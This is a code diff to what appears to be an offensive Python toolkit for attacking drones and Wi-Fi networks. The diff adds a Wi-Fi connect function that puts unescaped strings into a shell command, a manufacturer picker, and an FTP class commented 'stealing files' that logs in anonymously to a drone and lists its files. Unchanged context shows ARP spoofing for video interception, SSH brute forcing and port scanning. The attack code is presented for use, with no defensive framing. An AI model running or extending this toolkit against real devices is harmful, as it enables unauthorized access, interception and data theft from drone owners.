@@ -11,6 +11,7 @@ import paramiko
 from scapy.all import ARP, Ether, srp
 import ipaddress
 from datetime import datetime
+from ftplib import FTP
 import json
 from concurrent.futures import ThreadPoolExecutor
 
@@ -176,6 +177,15 @@ class WiFi_toolkit:
         except FileNotFoundError:
             print("Error: Aircrack-ng not found. Please make sure it is installed and in your PATH.")
     
+    # Connect to WiFi Network
+    def connect_to_wifi(wifi_name, password):
+        command = f'nmcli device wifi connect "{wifi_name}" password "{password}"'
+        try:
+            subprocess.run(command, shell=True, check=True)
+            print(f"Connected to {wifi_name} successfully.")
+        except subprocess.CalledProcessError:
+            print(f"Failed to connect to {wifi_name}.")
+
     def extract_subnet(interface):
         try:
             # Get the IP address and netmask for the interface using the 'ip addr' command
@@ -269,6 +279,37 @@ class WiFi_toolkit:
             for port in range(1, 1001):  # Scan common ports
                 executor.submit(scan_port, port)
 
+                
+# Get Drone Manufacturer
+class DroneSelector:
+    def __init__(self):
+        self.manufacturers = ["DJI","Parrot","Yuneec"]
+
+    def add_manufacturer(self, name):
+        self.manufacturers.append(name)
+
+    def select_manufacturer(self):
+        if not self.manufacturers:
+            print("No manufacturers available.")
+            return None
+        print("Available Manufacturers:")
+        for index, manufacturer in enumerate(self.manufacturers, start=1):
+            print(f"{index}. {manufacturer}")
+        choice = input("Enter the number corresponding to the manufacturer: ")
+        try:
+            choice_index = int(choice) - 1
+            if 0 <= choice_index < len(self.manufacturers):
+                print(f"You selected {self.manufacturers[choice_index]} as the manufacturer.")
+                return self.manufacturers[choice_index]
+            else:
+                print("Invalid choice. Please select a valid manufacturer.")
+                return None
+        except ValueError:
+            print("Invalid input. Please enter a number.")
+            return None
+
+
+                
 # ARP Spoofing & Vidieo Intercepting
 class ARPSpoofer:
     def __init__(self, target_ip, spoof_ip, interface):
@@ -329,7 +370,37 @@ class SSHBruteForce:
                 if self.ssh_connect(username, password):
                     return True
         return False
-# Get Drone Manufacturer
+
+# FTP Connection and stealing files
+
+class DroneFTPConnector:
+    def __init__(self, drone_ip):
+        self.drone_ip = drone_ip
+        self.ftp = FTP()
+
+    def connect(self):
+        try:
+            self.ftp.connect(self.drone_ip)
+            self.ftp.login()  # Null session login (anonymous)
+            print("Connected to FTP server successfully.")
+        except Exception as e:
+            print(f"Failed to connect to FTP server: {e}")
+
+    def list_files(self):
+        try:
+            files = self.ftp.nlst()
+            print("Files in the current directory:")
+            for file in files:
+                print(file)
+        except Exception as e:
+            print(f"Failed to list files: {e}")
+
+    def disconnect(self):
+        try:
+            self.ftp.quit()
+            print("Disconnected from FTP server.")
+        except Exception as e:
+            print(f"Error while disconnecting: {e}")
 
 # Turnon Camera 
 
